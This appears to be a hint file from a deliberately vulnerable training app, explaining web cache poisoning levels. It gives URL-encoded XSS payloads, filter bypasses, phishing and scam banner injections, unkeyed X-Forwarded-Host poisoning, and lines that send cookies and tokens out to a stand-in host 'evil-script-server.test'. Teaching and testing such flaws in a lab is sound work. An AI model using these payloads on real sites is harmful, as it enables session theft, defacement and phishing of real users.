CACHE_POISONING_PAYLOAD_LEVEL_1=This level simulates a shared cache that stores the response only by route.</br>\
<b>How to exploit this level?</b><br/>\
1. Call <code>/VulnerableApp/CachePoisoning/LEVEL_1?banner=FAKE%20URGENT%20UPDATE</code> to poison the cache.<br/>\
2. Call <code>/VulnerableApp/CachePoisoning/LEVEL_1</code> without the query parameter.<br/>\
3. The second response is served from cache and still contains the poisoned banner.
CACHE_POISONING_PAYLOAD_LEVEL_1_XSS=Since the banner is reflected without escaping, we can inject a script.</br>\
<b>How to exploit?</b><br/>\
1. Call <code>/VulnerableApp/CachePoisoning/LEVEL_1?banner=%3Cscript%3Ealert(document.cookie)%3C/script%3E</code>.<br/>\
2. All users accessing <code>/VulnerableApp/CachePoisoning/LEVEL_1</code> will now execute the script due to the poisoned cache.<br/>\
<b>Alternative payloads:</b> <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>, <code>&lt;svg onload=alert(document.cookie)&gt;</code>, <code>&lt;iframe src="javascript:alert(document.cookie)"&gt;</code>.
CACHE_POISONING_PAYLOAD_LEVEL_2=This level adds a naive filter that removes only obvious script payloads, but the cache key is still based on the route alone.</br>\
<b>How to exploit this level?</b><br/>\
1. Call <code>/VulnerableApp/CachePoisoning/LEVEL_2?banner=%3Cb%3EURGENT%20STATUS%20UPDATE%3C/b%3E</code> to poison the cache with harmless-looking HTML.<br/>\
2. Call <code>/VulnerableApp/CachePoisoning/LEVEL_2</code> without the query parameter.<br/>\
3. The victim still receives the cached attacker-controlled response even though the app tried to filter the input.<br/>\
<b>Alternative payloads:</b> <code>&lt;a href="https://phishing.example"&gt;Reauthenticate here&lt;/a&gt;</code> (phishing link), <code>&lt;h1 style="color:red"&gt;SYSTEM BREACH - CALL SUPPORT 1-800-SCAM&lt;/h1&gt;</code> (social engineering), <code>&lt;marquee&gt;Service outage: please resend payment&lt;/marquee&gt;</code> (misleading notice).
CACHE_POISONING_PAYLOAD_LEVEL_2_XSS=Obvious script tags are filtered, but we can use HTML event handlers.</br>\
<b>How to exploit?</b><br/>\
1. Call <code>/VulnerableApp/CachePoisoning/LEVEL_2?banner=%3Cimg%20src=%22x%22%20onerror=%22alert(document.cookie)%22%3E</code>.<br/>\
2. The server-side filter misses this, and the cache stores the malicious image tag, causing XSS for everyone.<br/>\
<b>Alternative bypasses:</b> <code>&lt;svg onload=alert(document.cookie)&gt;</code>, <code>&lt;input autofocus onfocus=alert(document.cookie)&gt;</code>, <code>&lt;body onload=alert(document.cookie)&gt;</code>. The naive filter only strips <code>&lt;script&gt;</code> tags and the <code>javascript:</code> scheme, so any other event handler bypasses it.
CACHE_POISONING_PAYLOAD_LEVEL_3=The <code>banner</code> query parameter is now part of the cache key, so different banners produce different cache entries. However, the <code>X-Forwarded-Host</code> header is reflected in the response (used to build the asset URL) but is <b>not</b> part of the cache key - it is an <b>unkeyed header</b>. That mismatch is the poisoning primitive.</br>\
<b>How to exploit this level?</b><br/>\
1. As attacker, call <code>/VulnerableApp/CachePoisoning/LEVEL_3?banner=shared-status</code> with header <code>X-Forwarded-Host: attacker.example</code>. The response now embeds <code>https://attacker.example/assets/cache-poisoning-demo.js</code> and is stored under the cache key <code>.../LEVEL_3|banner=shared-status</code>.<br/>\
2. As victim, call <code>/VulnerableApp/CachePoisoning/LEVEL_3?banner=shared-status</code> <b>without</b> the header. The key matches the poisoned entry, so the victim gets the attacker-controlled host.<br/>\
3. Verify the poisoning by inspecting the response header <code>X-Cache-Status: HIT</code> on the victim request - it confirms the body came from the poisoned cache entry.<br/>\
<b>Alternative payloads:</b> <code>X-Forwarded-Host: login-cdn.test</code> (typosquat a plausible CDN to phish users), <code>X-Forwarded-Host: 192.168.1.1</code> (force the browser to request an internal IP, showing SSRF-adjacent effects), <code>X-Forwarded-Host: cdn-backup.test</code> (impersonate a legitimate-looking backup CDN).
CACHE_POISONING_PAYLOAD_LEVEL_3_JS_INJECTION=Because the asset URL is attacker-controlled (see base payload above), the page will load its JavaScript from whatever host the attacker sets. If the attacker serves malicious JS at that host, every victim hitting the poisoned cache entry executes it - a stored XSS primitive scoped to all users of the cached route.</br>\
<b>Lab note:</b> <code>evil-script-server.test</code> is used as a placeholder name representing an attacker-controlled host. The domain will not resolve in this lab, so the browser will fail to load the script - that is expected. To confirm the injection worked, open the browser DevTools <b>Network tab</b> and observe the failed request to <code>https://evil-script-server.test/assets/cache-poisoning-demo.js</code>. In a real attack the adversary would own a live domain and the request would succeed.<br/>\
<b>Payload:</b> Send <code>X-Forwarded-Host: evil-script-server.test</code> while requesting <code>/VulnerableApp/CachePoisoning/LEVEL_3?banner=shared-status</code>. Subsequent victims requesting the same banner will load the asset from <code>evil-script-server.test</code>.<br/>\
<b>Impact:</b> The malicious JS runs in the victim's origin, giving the attacker full control over the page (DOM, cookies, storage).<br/>\
<b>Alternative payloads (JS hosted by the attacker at <code>/assets/cache-poisoning-demo.js</code>):</b> <code>fetch("https://evil-script-server.test/?c="+document.cookie)</code> (cookie exfiltration), <code>document.body.innerHTML="&lt;h1&gt;Defaced&lt;/h1&gt;"</code> (page defacement), <code>new Image().src="https://evil-script-server.test/?k="+localStorage.getItem("token")</code> (token exfiltration via image beacon).
CACHE_POISONING_PAYLOAD_LEVEL_4=This level stops trusting forwarding headers, but still caches personalized content publicly.</br>\
<b>How to exploit this level?</b><br/>\
1. Call <code>/VulnerableApp/CachePoisoning/LEVEL_4</code> with cookie <code>demo_user=admin</code>.<br/>\
2. Call <code>/VulnerableApp/CachePoisoning/LEVEL_4</code> again without the cookie.<br/>\
3. The victim still receives the cached personalized greeting for the attacker.
CACHE_POISONING_PAYLOAD_LEVEL_5=This secure level ignores untrusted forwarding headers and does not store personalized responses in the shared cache.</br>\
<b>What to verify?</b><br/>\
1. Try sending <code>X-Forwarded-Host: attacker.example</code> and an optional banner.<br/>\
2. Send a personalized request with cookie <code>demo_user=admin</code>.<br/>\
3. Send a second request without the cookie and observe that the response is fresh and not reused from shared cache.
